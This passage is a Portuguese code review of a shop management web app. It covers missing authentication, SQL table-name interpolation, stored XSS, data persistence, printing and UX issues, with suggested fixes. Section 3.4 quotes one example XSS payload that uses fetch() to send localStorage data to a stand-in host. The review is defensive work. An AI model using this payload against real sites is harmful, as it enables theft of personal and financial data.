# Análise técnica — New Star Notebook

**Arquivos analisados:** `index.html`, `style.css`, `script.js`, `server.js` e `package.json` (1.601 linhas)
**Data da análise:** 21/10/2026
**Tipo:** revisão de arquitetura, segurança, integridade de dados, UX e manutenção (não é uma auditoria de segurança formal)

> Esta análise é sobre os 5 arquivos enviados. Se a estrutura real do projeto tiver uma pasta `public/` com os arquivos do front, o item 3.5 muda; o restante continua válido.

---

## TL;DR — o resumo em 2 minutos

O sistema **funciona e tem boas ideias** (abas, geração de OS, etiqueta de estoque, alerta de atraso, dashboard financeiro), mas hoje ele é um **aplicativo "local-first" disfarçado de sistema com banco de dados**:

- O banco de verdade é o **`localStorage` do navegador** (`script.js:2`). O SQLite guarda, na prática, **apenas o estoque de notebooks** (e os logs de auditoria) — e olhe lá, de forma parcial.
- **Não existe login.** Quem estiver na mesma rede consegue ler nomes, telefones, dívidas e excluir registros pela API.
- O front monta as tabelas com `innerHTML` e dados sem escape (`script.js:96-112`), o que abre espaço para **XSS armazenado**.
- O nome da tabela na URL é interpolado direto no SQL (`server.js:155, 167, 170`).
- Existem **inconsistências entre a tela e o banco**: "C/ Maleta" não existe na tabela `servicos`, peças não têm `data`/`status` no banco, e "OS prontas" não tem tabela nenhuma.
- O botão **"Imprimir Direto" imprime uma página em branco**, porque o CSS de impressão esconde tudo e a classe `imprimindo-os` nunca é aplicada (`style.css:250`, `index.html:248`).
- Não há responsividade: em celular, os formulários em 2/3 colunas e as tabelas largas ficam impraticáveis (`style.css:56-66`).

**Se você fizer só três coisas nesta semana:**
1. **Exportar um backup** dos dados que estão no navegador (item 2).
2. **Passar todos os dados para o SQLite**, com o servidor como fonte da verdade (itens 3.1 e 4.1).
3. **Colocar login e HTTPS**, mesmo que o sistema rode só na loja (item 3.2).

### O que já está bom (e vale preservar)

- O sistema resolve o fluxo inteiro da loja em um só lugar: OS, contatos, financeiro, peças, estoque e documentos.
- A impressão de etiqueta de notebook e o relatório de estoque mostram cuidado com a operação real, não só com a tela.
- O alerta visual de OS parada há mais de 5 dias é uma ideia simples e útil.
- O dashboard de "a receber" e "recebido" dá uma visão imediata do caixa.
- Os valores nas queries SQL são passados por parâmetro (`?`), o que já elimina a injeção clássica por valor — o problema está só nos nomes de tabela.
- O código é legível, em português, sem framework pesado, e os arquivos estão separados por responsabilidade (HTML, CSS, JS, servidor).
- O PDF e as etiquetas já entregam valor no dia a dia; o que falta é confiabilidade e acabamento, não reinvenção.

### Nota por área

| Área | Nota | Comentário |
|---|---:|---|
| Persistência dos dados | 2/10 | O dado principal mora no navegador; limpar cache = perder histórico |
| Segurança | 2/10 | Sem login, sem HTTPS, XSS, tabela interpolada no SQL |
| Integridade/consistência | 3/10 | Schema divergente, sem validação, sem transações, logs não confiáveis |
| UX no desktop | 6/10 | Fluxos claros, mas com `alert`/`confirm`, sem loading e sem estados vazios |
| Mobile | 3/10 | Nenhum `@media` além de impressão; tabelas e grids estouram a tela |
| Impressão/PDF | 6/10 | PDF existe e é útil, mas é rasterizado, depende de CDN e o "Imprimir Direto" está quebrado |
| Manutenibilidade | 5/10 | 655 linhas em um arquivo global, `onclick` inline, muita repetição |
| Testes/observabilidade | 1/10 | Nenhum teste, nenhum lint, logs de auditoria sem usuário e não exibidos |

---

## 1. Como o sistema funciona hoje

```
┌──────────────────────── NAVEGADOR ────────────────────────┐         ┌──────────────── SERVIDOR ────────────────┐
│  script.js                                                 │         │  server.js (Express)                     │
│                                                            │         │                                          │
│  dados = JSON.parse(localStorage['newStarData'])  ◀──┐     │  GET    │  GET  /api/dados      (lê tudo)          │
│  servicos, telefones, financeiro, pecas,             │     │ ──────▶ │  POST /api/:tabela    (insere)           │
│  osProntas, notebooksLoja                            │     │         │  PUT  /api/:tabela/:id (status/estoque)  │
│                                                      │     │ ◀────── │  DEL  /api/:tabela/:id                   │
│  Toda a regra de negócio e a renderização ficam aqui │     │  JSON   │                                          │
│                                                      └─────┘         │  SQLite: servicos, telefones,            │
│  Só notebooksLoja é enviado/recebido do servidor           │         │  financeiro, pecas, notebooks_loja, logs │
└────────────────────────────────────────────────────────────┘         └──────────────────────────────────────────┘
```

O detalhe importante: o `GET /api/dados` é chamado no carregamento (`script.js:20-33`), mas o front **descarta tudo, menos `notebooksLoja`**. Serviços, contatos, financeiro, peças e logs que estejam no SQLite nunca chegam à tela.

### O que está persistido onde

| Entidade | Fonte da verdade hoje | Tabela no SQLite | API usada pelo front | Sincronizado? |
|---|---|---|---|---|
| Serviços / OS | `localStorage` | `servicos` (sem `cmaleta`) | só `GET /api/dados` (ignorado) | ❌ |
| Contatos | `localStorage` | `telefones` | nenhuma | ❌ |
| Financeiro | `localStorage` | `financeiro` | nenhuma | ❌ |
| Peças e fontes | `localStorage` | `pecas` (sem `data`/`status`) | nenhuma | ❌ |
| OS prontas | `localStorage` | **não existe** | nenhuma | ❌ |
| Notebooks da loja | `localStorage` + SQLite | `notebooks_loja` | POST/PUT/DELETE | ⚠️ parcial |
| Logs de auditoria | SQLite | `logs` | só leitura no `/api/dados` (ignorado) | ⚠️ |

Ou seja: o banco está ali, o schema está criado, mas **99% do uso real do sistema não passa por ele**.

---

## 2. Antes de qualquer mudança: faça backup (hoje)

Se você já usa o sistema na loja, **não limpe os dados do navegador, não troque de navegador e não abra o `index.html` por outro caminho antes de exportar o `localStorage`**. Cada origem (arquivo aberto com duplo clique, `http://localhost:3000`, `http://192.168.0.10:3000`) tem um `localStorage` **diferente**. O mesmo sistema aberto de duas formas parece ter "perdido" os dados.

Abra o sistema, pressione `F12` → Console e rode:

```js
// Exporta um backup completo em JSON
const dados = localStorage.getItem('newStarData') || '{}';
const blob = new Blob([dados], { type: 'application/json' });
const a = document.createElement('a');
a.href = URL.createObjectURL(blob);
a.download = `backup-new-star-${new Date().toISOString().slice(0, 10)}.json`;
a.click();
```

Guarde esse arquivo **fora do computador da loja** (Google Drive, e-mail, pendrive). Enquanto o sistema não tiver backup automático, esse JSON é o seu único plano B.

> Um banco SQLite bem cuidado é mais fácil de fazer backup: basta copiar o arquivo com o servidor parado ou usar `VACUUM INTO 'backup.db'`. Mas isso só resolve os notebooks hoje.

---

## 3. Problemas críticos (P0)

### 3.1 O banco de verdade é o navegador

**Onde:** `script.js:2` (leitura), `script.js:16` (`salvarBanco`), `script.js:596-653` (cadastro/exclusão), `script.js:421-455` (OS).

Tudo que o usuário cadastra entra em um objeto JavaScript e é serializado em `localStorage`. O SQLite só é acionado para notebooks (`script.js:307-334`, `641-652`).

**Por que isso é grave:**

- **Limpar cache/dados do navegador apaga o histórico da loja inteira.** Não existe "desfazer".
- **Outro computador, outro celular ou outro navegador não vê nada.** O sistema não é multiusuário de verdade.
- **Aba anônima = banco vazio.** Trocou de perfil do Chrome? Banco vazio.
- **A mesma página aberta por caminhos diferentes = bancos diferentes** (`file:///.../index.html` ≠ `http://localhost:3000`).
- **Limite de ~5 MB** do `localStorage`. Com textos de OS, fotos não (não há fotos), mas o volume cresce e o `setItem` pode lançar `QuotaExceededError` — que o código não trata (`script.js:16`).
- **Duas abas abertas sobrescrevem uma à outra** (last-write-wins), porque cada aba tem sua cópia em memória.
- **Não há backup, exportação, importação nem auditoria de quem mudou o quê.**

**Como corrigir:** o servidor passa a ser a fonte da verdade. O front deixa de manter arrays próprios e passa a chamar endpoints por entidade (`/api/servicos`, `/api/clientes`, `/api/os`...). Se quiser manter funcionamento offline, `localStorage` vira apenas **cache** com fila de sincronização — nunca o banco principal. E adicione botões "Exportar backup" e "Importar backup" desde já.

---

### 3.2 Sem autenticação e escutando em todas as interfaces

**Onde:** `server.js:178-180` (`app.listen(PORT)`), `server.js:78-94` (`GET /api/dados`), `server.js:96-176` (escrita).

Não há login, sessão, token, permissão, rate limit nem HTTPS. Qualquer pessoa na mesma rede Wi-Fi da loja pode:

- abrir `http://IP-DA-LOJA:3000/api/dados` e receber **todos os nomes, telefones, valores, notebooks e logs**;
- fazer `POST`, `PUT` e `DELETE` e alterar ou apagar registros;
- apagar entradas de log uma a uma (`DELETE /api/logs/:id`), destruindo a trilha de auditoria.

Isso envolve **dados pessoais e financeiros** (nomes, telefones, endereço, CPF/CNPJ do prestador, valores a receber). Em termos de LGPD, é exposição de dados sem controle de acesso. Se o sistema estiver exposto na internet por port forwarding, o risco é ainda maior.

**Como corrigir (mínimo viável):**

1. Login com e-mail/usuário e senha (hash com `argon2` ou `bcrypt`), sessão em cookie `httpOnly`, `secure`, `sameSite=lax`.
2. Middleware `exigirLogin` em todas as rotas `/api/*`, exceto `/api/login`.
3. Perfis: `admin` (tudo) e `atendente` (sem excluir, sem financeiro, por exemplo).
4. HTTPS na frente (Caddy ou Nginx com certificado) e `helmet` para headers.
5. `express-rate-limit` no login e nas rotas de escrita.
6. Firewall: se o sistema roda em um PC só, escute em `127.0.0.1` e use um proxy local; se precisa de acesso na rede, restrinja por IP/VLAN.
7. CSRF token nas rotas que mudam estado quando usar cookie de sessão.

Esboço:

```js
// npm i express-session argon2 helmet express-rate-limit
app.use(helmet());
app.use(session({
  secret: process.env.SESSION_SECRET,
  resave: false,
  saveUninitialized: false,
  cookie: { httpOnly: true, secure: process.env.NODE_ENV === 'production', sameSite: 'lax' }
}));

app.post('/api/login', limitador, async (req, res) => {
  const usuario = await buscarUsuarioPorEmail(req.body.email);
  const ok = usuario && await argon2.verify(usuario.senha_hash, req.body.senha);
  if (!ok) return res.status(401).json({ erro: 'Credenciais inválidas' });
  req.session.usuario = { id: usuario.id, nome: usuario.nome, papel: usuario.papel };
  res.json({ ok: true });
});

function exigirLogin(req, res, next) {
  if (!req.session.usuario) return res.status(401).json({ erro: 'Não autenticado' });
  next();
}
app.use('/api', exigirLogin);
```

> Mesmo que o sistema rode em um único computador da loja, coloque login. Qualquer pessoa que sentar naquela máquina (ou um malware no navegador) consegue ler e apagar tudo.

---

### 3.3 Nome de tabela vindo da URL é interpolado no SQL

**Onde:** `server.js:155` (`UPDATE ${tabela}`), `server.js:167` (`SELECT * FROM ${tabela}`), `server.js:170` (`DELETE FROM ${tabela}`).

O `POST` tem uma lista de tabelas válidas (`if/else`), mas o `PUT` e o `DELETE` aceitam **qualquer string** como nome de tabela. O binding de parâmetros protege os *valores*, não os *identificadores*. Na prática:

- `DELETE /api/logs/1` apaga o log 1 — a trilha de auditoria pode ser limpa pela API.
- `DELETE /api/qualquer_tabela/1` tenta apagar de qualquer tabela existente.
- Dependendo da versão do driver e do formato da URL, a interpolação pode permitir variações de injeção (comentários `--`, `WHERE` extra etc.). Mesmo que o driver atual rejeite alguns casos, é uma vulnerabilidade latente que não deve existir.

**Como corrigir:** um mapa de tabelas permitidas, sem interpolar nada que venha do usuário:

```js
const TABELAS = {
  servicos:        { rotulo: 'Ordens de Serviço', status: ['Em andamento', 'Pronto', 'Entregue'] },
  telefones:       { rotulo: 'Contatos' },
  financeiro:      { rotulo: 'Financeiro', status: ['DEVENDO', 'PAGO'] },
  pecas:           { rotulo: 'Peças e Fontes', status: ['Não devolvido', 'Devolvido'] },
  notebooks_loja:  { rotulo: 'Notebooks Loja' },
  // logs NÃO entra aqui: auditoria não se apaga pela API
};

function tabelaPermitida(req, res, next) {
  const config = TABELAS[req.params.tabela];
  if (!config) return res.status(400).json({ erro: 'Tabela inválida' });
  req.tabelaConfig = config;
  next();
}
```

E, melhor ainda, abandonar rotas genéricas `/api/:tabela` e criar rotas explícitas (`/api/servicos`, `/api/financeiro`...) com validação de schema. Rotas genéricas facilitam esse tipo de erro.

---

### 3.4 XSS armazenado: dados do usuário entram no HTML sem escape

**Onde:** `script.js:96-112`, `122-126`, `142-152`, `166-175`, `191-203`, `217-229`, `238-246` (todas as tabelas), `script.js:550-552` (edição inline do local), `script.js:405` (etiqueta).

Todo campo digitado é concatenado direto no `innerHTML`:

```js
tbodyServicos.innerHTML += `
  <tr>
    <td>${s.nome}</td>
    <td>${s.desc}</td>
    <td onclick="ativarEdicaoLocal(${index}, this)">${s.local || '-'}</td>
  ...
```

Se alguém cadastrar um cliente chamado:

```html
<img src=x onerror="fetch('https://exemplo.com/?d='+localStorage.newStarData)">
```

esse script roda no navegador de quem abrir a lista. Hoje o impacto já é sério (o atacante leva **todos os dados do `localStorage`**); quando houver login, passa a ser roubo de sessão. O mesmo vale para `value="${localAtual}"` em `script.js:552`, que quebra o atributo se o texto tiver aspas.

**Como corrigir:**

```js
function esc(valor) {
  return String(valor ?? '').replace(/[&<>"']/g, (c) => ({
    '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;'
  }[c]));
}

// uso:
`<td>${esc(s.nome)}</td>`
```

Prefira criar elementos com `textContent` para dados do usuário. E adicione uma **CSP** restritiva (`default-src 'self'`) — o que também exige tirar os `onclick` e os `style="..."` inline e hospedar o `html2pdf` localmente.

---

### 3.5 Estrutura e contrato de dados inconsistentes

**Estrutura de arquivos:** `server.js:9` serve `public/`, mas os arquivos enviados estão na raiz. Se a sua pasta real também é assim, `npm start` sobe o servidor e `http://localhost:3000` responde **Cannot GET /** — o front só funciona abrindo o `index.html` direto, e aí `fetch('/api/dados')` falha (origem `file://`), caindo no modo localStorage. O sistema "com banco" nunca usa o banco. Se você tem `public/` na sua máquina, só confirme que é essa pasta que está versionada.

**Schema divergente:** mesmo que você ligue o front na API, estes campos não batem:

| Campo na tela | Situação no SQLite | Consequência |
|---|---|---|
| C/ Maleta (`srv-cmaleta`, `script.js:605`) | coluna não existe em `servicos` (`server.js:22-25`) | INSERT com a coluna falha ou o dado é descartado |
| Descrição (`s.desc`) | API grava em `descricao`; o GET devolve `descricao` (`server.js:104-105`, `86`) | na leitura, `s.desc` fica `undefined` e a coluna aparece vazia |
| Data e status de peças (`script.js:630-632`) | tabela `pecas` só tem `cliente, item` (`server.js:37-40`) | dois campos da tela não são persistidos |
| OS prontas (`dados.osProntas`) | **não existe tabela nem rota** | todo o histórico de OS fica só no navegador |
| `PUT` genérico de status | `telefones` e `pecas` não têm coluna `status` | erro 500 se a rota for usada nessas tabelas |

**Como corrigir:** definir o schema como contrato único, criar **migrações** (não só `CREATE TABLE IF NOT EXISTS`, que não adiciona colunas em bancos existentes) e alinhar nomes entre API e front. Um arquivo `001-inicial.sql` + uma tabela `schema_migrations` (ou `PRAGMA user_version`) resolve. Trocar `desc`/`descricao` por um nome só desde o começo.

---

### 3.6 "Imprimir Direto" imprime uma página em branco

**Onde:** `style.css:249-252` esconde **todos** os elementos na impressão:

```css
@media print {
  body * { visibility: hidden !important; }
  ...
}
```

Só ficam visíveis os blocos marcados com `body.imprimindo-os`, `imprimindo-os-cliente`, `imprimindo-etiqueta` ou `imprimindo-relatorio-estoque` (`style.css:260-310`). O botão "Imprimir Direto" (`index.html:248`) chama `window.print()` **sem adicionar nenhuma dessas classes**:

```html
<button type="button" class="btn-primary" onclick="window.print()">Imprimir Direto</button>
```

Resultado: impressão em branco (ou só o cabeçalho/rodapé do navegador). As outras impressões (`imprimirOSClienteLoja`, etiqueta, relatório) adicionam a classe, mas removem logo depois de `window.print()` — em navegadores que não bloqueiam a chamada (Safari), a classe pode sair antes de a impressão acontecer.

**Correção mínima:**

```js
function imprimirGeradorOS() {
  document.body.classList.add('imprimindo-os');
  window.addEventListener('afterprint', () => {
    document.body.classList.remove('imprimindo-os');
  }, { once: true });
  window.print();
}
```

```html
<button type="button" class="btn-primary" onclick="imprimirGeradorOS()">Imprimir Direto</button>
```

E adicione `@page { size: A4; margin: 12mm; }` mais regras de `page-break-inside: avoid` para o cabeçalho e os blocos.

---

### 3.7 Banco e backups podem parar no Git

Não há `.gitignore`. O banco é criado em `./database.sqlite` (`server.js:13`), ou seja, **na raiz do projeto**. Se alguém commitar esse arquivo, nomes, telefones, endereços e dívidas de clientes vão para o repositório (e para o histórico, mesmo que depois seja removido).

**Correção:** criar `.gitignore` **antes** de rodar o sistema no repositório:

```gitignore
node_modules/
database.sqlite
database.sqlite-*
*.sqlite-journal
*.sqlite-wal
*.sqlite-shm
.env
backups/
*.log
.DS_Store
```

E mover o banco para uma pasta fora do versionamento, com caminho absoluto baseado em `__dirname`:

```js
const DB_PATH = process.env.DB_PATH || path.join(__dirname, 'data', 'newstar.db');
```

Se o arquivo já foi commitado alguma vez, remova do histórico (`git filter-repo` ou BFG) e considere que os dados ficaram expostos.

---

## 4. Problemas altos (P1) — integridade dos dados

### 4.1 A sincronização dos notebooks perde dados

O único fluxo ligado ao servidor tem quatro falhas:

1. **Salva local antes de o servidor responder.** Em `script.js:319`, o item entra no array; o `id` só chega depois (`script.js:326-330`). Se o `POST` falhar (servidor off, erro 500), o item fica **sem `id` para sempre** e nunca mais sincroniza — edições futuras caem no `if (nbExistente.id)` falso (`script.js:311`).
2. **Não confere `res.ok`.** Um 500 é tratado como sucesso e o `.catch` só pega erro de rede.
3. **Sobrescreve o local com o servidor sem comparar versões.** `script.js:24-27` substitui `dados.notebooksLoja` pela lista do servidor se ela tiver pelo menos um item. Se você editou offline ou o servidor estava desatualizado, **as alterações locais somem**; se você excluiu offline, o item **reaparece**.
4. **Exclusão otimista e silenciosa.** `script.js:647-649` remove da tela e manda o `DELETE`, mas ignora erros (`catch(err => {})`). Offline, o servidor mantém a cópia e ela volta no próximo carregamento.

**Como corrigir:** operações assíncronas com `await`, `res.ok`, estado de erro visível ("não foi possível salvar; tentar de novo"), `id` gerado no servidor e um campo `atualizado_em` para resolver conflitos. Idealmente, o front só renderiza depois da confirmação do servidor (ou usa fila offline explícita, com indicador de "pendente").

---

### 4.2 Sem validação, constraints ou unicidade

- O HTML tem `required`, mas **o botão "Salvar e Baixar PDF" não dispara submit** (`index.html:247` → `salvarEBaixarPDFOS`), então a validação nativa é ignorada. A função só confere número e cliente (`script.js:424`); equipamento, data e itens podem ir vazios.
- O servidor aceita qualquer corpo: não há schema, tipos, limites de tamanho nem lista de status válidos. `POST /api/servicos` com `{nome: null}` grava `null`.
- **Número de OS não é único.** Clicar duas vezes em "Salvar e Baixar PDF" cria duas OS com o mesmo número (`script.js:450`). Não existe `UNIQUE` em `servicos.num`.
- **Clientes são texto livre.** "João", "joao" e "João " viram três pessoas. O vínculo com o telefone é por igualdade de nome (`script.js:269`), então nomes repetidos pegam o telefone errado.
- **Sem `NOT NULL`, `DEFAULT`, `CHECK` nem `FOREIGN KEY`.** O banco aceita estados impossíveis.
- **Sem limite de tamanho** em textos: um campo gigante pode estourar o `localStorage`, inflar o banco e travar a renderização.
- **Identidade por índice de array.** `ativarEdicaoStatus(${index})`, `removerItem('servicos', ${index})` etc. funcionam hoje porque não há ordenação, mas qualquer `sort`, filtro reordenado ou inserção concorrente passa a editar/excluir **o item errado**. Use `id` estável em todas as operações.

**Como corrigir:** validação no servidor (Zod/Joi), constraints no SQLite, `numero` único e gerado por sequência, `cliente_id`/`equipamento_id` no lugar de nomes, e IDs nas ações do front.

---

### 4.3 Dinheiro tratado como texto e com formatação errada

- `financeiro.valor` é `TEXT` no banco (`server.js:32-35`); no front, vira `parseFloat` (`script.js:138`) e é exibido com `toFixed(2)` (`script.js:148, 157-158`), que mostra **`R$ 1234.50`**, não `R$ 1.234,50`.
- O input `type="number"` (`index.html:142`) tem comportamento inconsistente entre navegadores com vírgula decimal: o valor interno é sempre com ponto, e em vários navegadores a digitação de `1.234,56` é rejeitada ou vira outro número. No Brasil, o usuário digita vírgula e o campo fica inválido ou vazio.
- Em "Notebooks Loja", o preço é **texto livre** (`index.html:295`: "R$ 1.600,00 (4X SEM JUROS)"). Não dá para somar o valor do estoque, ordenar por preço nem filtrar por faixa.
- `parseFloat` de valores com máscara (`"R$ 1.600,00"`) retorna `NaN`; `parseFloat("1.600,00")` retorna `1.6`. Ou seja: nunca dá `1600` — o valor é perdido ou fica 1000× menor, sem aviso.

**Como corrigir:** guardar **centavos como `INTEGER`** (`valor_centavos`) e formatar na saída:

```js
const brl = new Intl.NumberFormat('pt-BR', { style: 'currency', currency: 'BRL' });
brl.format(160000 / 100); // "R$ 1.600,00"
```

No input, use `type="text" inputmode="decimal"` com máscara, ou um componente de moeda; converta para centavos no envio. Separe "preço" (número) de "condições de pagamento" (texto) no estoque.

---

### 4.4 Datas com fuso e off-by-one

`obterClasseStatus` (`script.js:59-76`) faz:

```js
const entrada = new Date(dataEntrada); // "2026-10-01" => 2026-10-01T00:00:00Z
const diffDias = Math.ceil((hoje - entrada) / 86400000);
```

`new Date("2026-10-01")` é interpretada como **UTC**. No Brasil (UTC−3), ela vira `30/09/2026 21:00` no horário local. O cálculo de "atrasado há mais de 5 dias" pode errar por um dia, e datas inválidas viram `NaN` (o badge fica como "em andamento" sem aviso). `formatarData` (`script.js:78-85`) só funciona com `YYYY-MM-DD`; se vier data com hora, exibe errado.

**Como corrigir:** guardar timestamps em ISO 8601 UTC (`datetime('now')` no SQLite) e comparar por data local; para datas "puras" (entrada, previsão), usar `T00:00:00` local ou comparar strings `YYYY-MM-DD` diretamente. Formatar com `Intl.DateTimeFormat('pt-BR')`.

---

### 4.5 Logs não confiáveis e invisíveis

- `registrarLog` é chamado **antes** do `INSERT/UPDATE/DELETE` terminar — veja `server.js:107, 112, 117, 122 e 127` e também `server.js:148`, `157` e `172`. Se a escrita falhar, o log diz que "cadastrou" mesmo assim.
- O log é gravado mesmo quando **nenhuma linha foi afetada** (id inexistente); a API responde `{sucesso: true}` sempre.
- `data_hora` é uma string `DD/MM/YYYY às HH:MM:SS` (`server.js:57-66`), difícil de ordenar/filtrar e dependente do fuso do servidor.
- Não há **usuário** no log, nem `entidade_id`: dá para saber que "algo" mudou, mas não reconstruir a OS.
- O log de exclusão guarda o **registro inteiro em JSON** (com dados pessoais), sem política de retenção.
- **Os logs não aparecem em nenhuma tela** e o `GET` devolve no máximo 100 (`server.js:85`), que o front ignora.
- A rota `DELETE /api/logs/:id` permite apagar a auditoria (item 3.3).

**Como corrigir:** gravar o log **depois** do sucesso, na mesma transação, com `usuario_id`, `entidade`, `entidade_id`, `acao`, `antes_json`, `depois_json` e timestamp ISO. Não expor `DELETE` para auditoria. Criar uma aba "Histórico" com filtros por usuário/data/entidade.

---

### 4.6 Sem backup, exportação ou importação

Não há como tirar os dados do navegador pela interface. Isso é consequência do item 3.1, mas merece prioridade própria: **qualquer migração para o servidor precisa de um caminho de importação do JSON atual**. Caso contrário, os dados existentes ficam para trás.

Implemente:

- `GET /api/backup` → JSON completo (ou `.zip` com o `.sqlite`).
- `POST /api/restore` → importa JSON validado, com transação.
- Botão "Exportar CSV" em cada tabela (financeiro, estoque, OS).
- Rotina automática: `sqlite3 newstar.db ".backup 'backups/newstar-YYYY-MM-DD.db'"` diária, mantendo 30 dias, e cópia para nuvem.

---

### 4.7 `localStorage` corrompido derruba o app na inicialização

`script.js:2` faz `JSON.parse` **sem `try/catch`**. Se o valor estiver corrompido (extensão do navegador, escrita interrompida, edição manual), o script inteiro lança uma exceção e **nenhuma função é definida**: a tela fica vazia e os botões param de funcionar. O mesmo vale para `salvarBanco`: se o `setItem` estourar a cota, a exceção interrompe o fluxo no meio (o dado já foi alterado em memória, mas não foi salvo, e a renderização pode não acontecer).

**Correção mínima:**

```js
let dados;
try {
  dados = JSON.parse(localStorage.getItem('newStarData')) || {};
} catch (e) {
  console.error('Banco local corrompido', e);
  dados = {};
  // avisar o usuário e oferecer restauração de backup
}
dados = { servicos: [], telefones: [], financeiro: [], pecas: [], osProntas: [], notebooksLoja: [], ...dados };

function salvarBanco() {
  try {
    localStorage.setItem('newStarData', JSON.stringify(dados));
  } catch (e) {
    mostrarErro('Não foi possível salvar: armazenamento cheio. Exporte um backup.');
    throw e; // ou trate para não deixar a UI inconsistente
  }
}
```

E adicione um campo `versao` ao objeto para permitir migrações futuras.

---

### 4.8 Múltiplas abas e concorrência

Duas abas abertas = duas cópias de `dados`. A última que salvar vence, e a outra continua exibindo dados velhos. Não há listener de `storage` nem bloqueio. Enquanto o servidor não for a fonte da verdade, isso é inevitável.

**Mitigação:** mover para o servidor (resolve), ou ao menos ouvir `window.addEventListener('storage', ...)` e recarregar, e desencorajar múltiplas abas.

---

## 5. Problemas médios (P2) — UX, mobile, impressão e acessibilidade

### 5.1 Não é responsivo

Não existe nenhum `@media` de layout — só o de impressão. `grid-2` e `grid-3` são fixos (`style.css:56-66`), e as tabelas com 8–10 colunas não têm `overflow-x`. No celular, o formulário fica espremido em duas colunas e a página inteira rola na horizontal. Para uma loja que pode usar celular/tablet no balcão, isso é um bloqueio prático.

**Sugestão:** um breakpoint em ~800px que transforme grids em uma coluna e envolva cada tabela em `.tabela-scroll { overflow-x: auto; }`; em telas pequenas, considere "cards" por registro em vez de tabela. Adicione também `-webkit-overflow-scrolling: touch`.

### 5.2 Busca, feedback e estados

- Busca existe só em Serviços, OS Prontas e Notebooks; faltam Contatos, Financeiro e Peças.
- O filtro usa `innerText` e `toLowerCase` (`script.js:506-531`), então **"João" não é encontrado por "joao"** (acentos). Use `normalize('NFD').replace(/\p{Diacritic}/gu, '')` nos dois lados.
- Filtra a cada tecla (`onkeyup`), sem debounce; em listas grandes, trava.
- Não há mensagem de "nenhum resultado", nem contador.
- `alert` e `confirm` nativos (`script.js:425, 642`) bloqueiam a página e não combinam com o restante da UI.
- Não há feedback de sucesso ("Serviço salvo"), nem estado de carregamento, nem indicação de offline/pendente.
- `visualizarOS` (`script.js:478-503`) sobrescreve o formulário atual sem avisar; se houver algo digitado, perde.
- A aba ativa não vai para a URL (`switchTab`), então **F5 volta para a primeira aba** e não dá para favoritar uma tela.

### 5.3 Impressão e PDF

- **"Imprimir Direto" em branco** (item 3.6).
- **PDF via `html2canvas`**: o conteúdo vira imagem rasterizada. Texto não selecionável, qualidade dependente da escala, formulários com bordas e selects, e o PDF não é acessível. Para documento fiscal/comprovante, um template HTML de impressão com `window.print()` (ou PDF gerado no servidor) é melhor.
- **Dependência de CDN sem SRI** (`index.html:9`). Se a internet cair, `html2pdf` não existe e `gerarPDF` lança `ReferenceError` — a OS é salva, mas o PDF não sai, sem mensagem clara. Baixe a biblioteca para `public/vendor/` e adicione `defer` + SRI, ou gere o PDF no servidor (`pdfkit`, `puppeteer`).
- **`setTimeout(400)`** em `carregarEBaixarPDF` (`script.js:470-476`) é uma aposta: se a renderização demorar, o PDF sai vazio/errado. Use `await html2pdf()...` ou um callback de conclusão.
- **Sem `@page`, sem `page-break-inside: avoid`, sem cabeçalho/rodapé.** OS longas cortam no meio de um bloco.
- **O documento é o próprio formulário.** Inputs vazios, selects e placeholders aparecem impressos. O ideal é um template separado, somente leitura, com os dados já formatados.
- **Não há numeração/sequência de OS** nem marca d'água de "via do cliente"/"via da loja".
- O PDF é gerado a partir do **formulário**, não de um template fixo: campos vazios e selects aparecem, e o botão "Salvar e Baixar PDF" sempre **cria uma nova OS** em vez de atualizar a existente — abrir uma OS antiga, editar e salvar gera uma duplicata, não uma correção.

### 5.4 Acessibilidade

- Todos os `<label>` estão soltos, sem `for`/`id` (ex.: `index.html:43`), então leitores de tela não associam o rótulo ao campo e clicar no texto não foca o input.
- As abas são `<button>` sem `role="tab"`, `aria-selected`, `aria-controls` e sem navegação por setas.
- Os badges de status são `<span onclick>` (`script.js:101` etc.): não recebem foco, não funcionam com teclado e não têm `aria-label` ("clique para alterar o status").
- Ícones são emojis dentro de botões (ok como reforço, mas devem ter texto acessível).
- `transition`/`animation` sem `prefers-reduced-motion`; o badge "atrasado" pisca (`style.css:155-165`) e pode incomodar.
- Contraste de alguns textos claros sobre fundos claros (badges) pode não passar em WCAG AA.
- Não há estilos de `:focus-visible`; a navegação por teclado fica invisível.

### 5.5 Performance

- **`innerHTML +=` dentro de `forEach`** (`script.js:96` e seguintes) reanalisa todo o HTML acumulado a cada linha: complexidade O(n²). Com algumas centenas de registros, a tela engasga. Faça `map(...).join('')` e atribua **uma vez**.
- `renderizarTabelas()` redesenha **todas** as tabelas a cada mudança, mesmo as invisíveis. Separe em funções por aba e renderize só a ativa.
- Toda edição de status/local chama `renderizarTabelas()` e reconstrói tudo. Atualize só a linha.
- Filtro sem debounce e varrendo o DOM inteiro a cada tecla.
- `localStorage.setItem` serializa o objeto inteiro (todas as entidades) a cada alteração — síncrono e bloqueante.

### 5.6 Organização visual e CSS

- Muitos estilos inline no HTML (`index.html:246, 296, 303, 305, 422` etc.) e no JS (`script.js:108, 552`), o que dificulta tema e manutenção.
- `td` com `display: flex` para alinhar botões (`script.js:110`, `202`, `226`) quebra o layout de tabela (a célula deixa de se comportar como `table-cell`).
- Cores repetidas (`#2563eb`, `#ef4444`, `#10b981`) sem variáveis CSS.
- Não há favicon, `theme-color`, nem identidade visual no cabeçalho.
- `style.css` não tem reset além do que o navegador dá; `body` com padding fixo de 20px atrapalha no mobile.
- O `<title>` é fixo; poderia refletir a aba atual ("Financeiro — New Star").

---

## 6. Problemas baixos (P3) — código, servidor e processo

### 6.1 Código do front

- `script.js` tem 655 linhas, estado global mutável e 31 funções globais. Não há módulos (`import/export`), separação entre estado, API e UI, nem constantes para status.
- `onclick`/`onsubmit` inline no HTML e strings de função no JS (`switchTab` procura `onclick.includes(tabName)`, `script.js:49-53`) — frágil e difícil de testar.
- Repetição de `document.getElementById(...)` e de templates de tabela.
- Duas telas de OS quase idênticas (`index.html:195-250` e `index.html:348-426`) com campos duplicados; qualquer mudança precisa ser feita duas vezes.
- `abrirOSClienteLoja` e `visualizarOS` fazem dezenas de atribuições manuais; um mapa `id → campo` reduziria isso.
- Nomes misturados PT/EN (`setTimeout`, `catch(err)`, `dados`), e strings de status repetidas em vários lugares.
- Sem `"use strict"` (não é crítico em módulos, mas o arquivo é script clássico).

**Sugestão de estrutura (sem precisar de framework):**

```
public/
├── index.html
├── css/
│   ├── base.css
│   ├── componentes.css
│   └── impressao.css
├── js/
│   ├── main.js          (inicialização e abas)
